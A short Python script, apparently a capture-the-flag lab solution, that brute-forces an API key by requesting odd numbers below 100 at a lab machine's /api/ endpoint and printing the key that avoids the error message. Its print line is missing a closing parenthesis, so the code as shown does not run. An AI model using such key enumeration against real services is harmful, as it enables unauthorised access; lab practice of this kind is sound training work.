import requests

machine_ip = "10.10.83.105"
host = f"http://{machine_ip}/api/"

# Only attempt odd keys
for key in range(100):
    if key % 2 != 0:
        response = requests.get(host + str(key))

        # Only print the correct api key
        if "Error. Key not valid!" not in response.text:
            print(f"The correct api key is {key}"
            break
